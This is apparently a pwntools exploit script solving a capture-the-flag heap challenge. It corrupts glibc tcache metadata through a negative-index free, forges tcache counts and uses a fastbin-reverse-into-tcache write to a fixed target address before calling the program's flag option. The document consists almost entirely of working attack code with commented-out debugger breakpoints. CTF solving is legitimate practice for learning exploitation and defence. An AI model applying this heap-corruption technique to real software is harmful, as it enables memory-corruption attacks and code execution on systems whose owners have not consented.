from pwn import *
filename="./pwn"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=elf.libc
context.terminal=['tmux','split','-hp','60']

def choice(idx):
    io.sendlineafter("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    io.sendline(str(sz))
    sleep(0.1)
    io.sendline(con)
    # sa("content?",cno)

def delete(idx):
    choice(2)
    sleep(0.1)
    io.sendline(str(idx))


def getflag():
    choice(3)

def debug():
    gdb.attach(io,"b *0x40153E")

# alloc a large chunk prepare to overwrite bk
payload1 = p64(0)*3 + p64(0x400)
add(0x288,payload1) # onlu used to set bk not null
# gdb.attach(io,"b *0x4013FD")
 # free control chunk
# sleep(0.1)
#          gdb.attach(io,"b *0x4013BF") # break at 2
# each free, put a 0x20 chunk into bins. so we need chunks with 0x21 first
pay_large = p64(0)*3+p64(0x401)+(p64(0)+p64(0x21))*0x7
pay = p64(0)+p64(0x21)
add(0x98,pay_large) # into tcache
add(0xa8,pay*10)
add(0xb8,pay*11)
add(0xc8,pay*12)
add(0xd8,pay*13)
add(0xe8,pay*14)
add(0xf8,pay*15)
add(0x108,pay*16)
add(0x118,pay*17)
# debug()
delete(-0x290)
# gdb.attach(io,"b *0x4013BF") # break at 2
choice(2)
add(0x288,p64(0)*2+p16(0x8)*4*3) # set all 7, then freed
# debug()
add(0x288,p64(0)*2+p16(0x8)*4*3+p16(0x1)*4*8+p64(0)*0xb+p8(0x70)) # change first block
# gdb.attach(io,"b *0x401387") # b malloc
add(0x98,'a') # freed 0x400 chunk, to overwrite bk

# badluck chunk
# add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*5+p64(0)*0xf+p8(0xe0))
# # gdb.attach(io,"b *0x4013A8") #b free
# add(0xa8,'a') # freed 0x20 into fastbin 

add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xa+p8(0xc0))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0xb8,'a') # fastbin 1,victim

add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xb+p8(0x80))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0xc8,'a') # fast2


add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xc+p8(0x50))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0xd8,'a') # fast3

add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xd+p8(0x30))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0xe8,'a') # fast4

add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xe+p8(0x20))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0xf8,'a') #fast5

add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0xf+p8(0x20))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0x108,'a') #fast6


add(0x288,p16(0x7)*4*2+p16(0x8)*4*3+p16(0x1)*4*0xb+p64(0)*0x10+p8(0x30))
# gdb.attach(io,"b *0x4013A8") #b free
# gdb.attach(io,"b *0x401387")
add(0x118,'a') #fast7

# malloc one 0x400 and overwrite victim's bk
payload = b'\x00'*0x148+p64(0x21)+p64(0x404070)
# gdb.attach(io,"b *0x4013A8") #b free
add(0x3f8,payload) # check last chunk

# release the padding chunk, changing the 0x400 chunk
# gdb.attach(io,"b *0x401387")
fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*40 # reset tcache
# debug() # show in blog
add(0x280,fake_t)  # reput after changed the padding one, so 0x20 is empty now
# debug()
add(0x18,'a') # fastbin reverse into tcache

fake_t = p16(0)*8*4+p16(0)*8*4+p64(0)*40 # reset tcache to null
# debug() # show in blog
add(0x280,fake_t)  # reput after changed the padding one, so 0x20 is empty now


# gdb.attach(io,"b *0x4013BF")
choice(2)
# gdb.attach(io,"b *0x401387") # b malloc
# add(0x18,'a') # write into target
# gdb.attach(io,"b *0x401444")
getflag()

io.interactive()
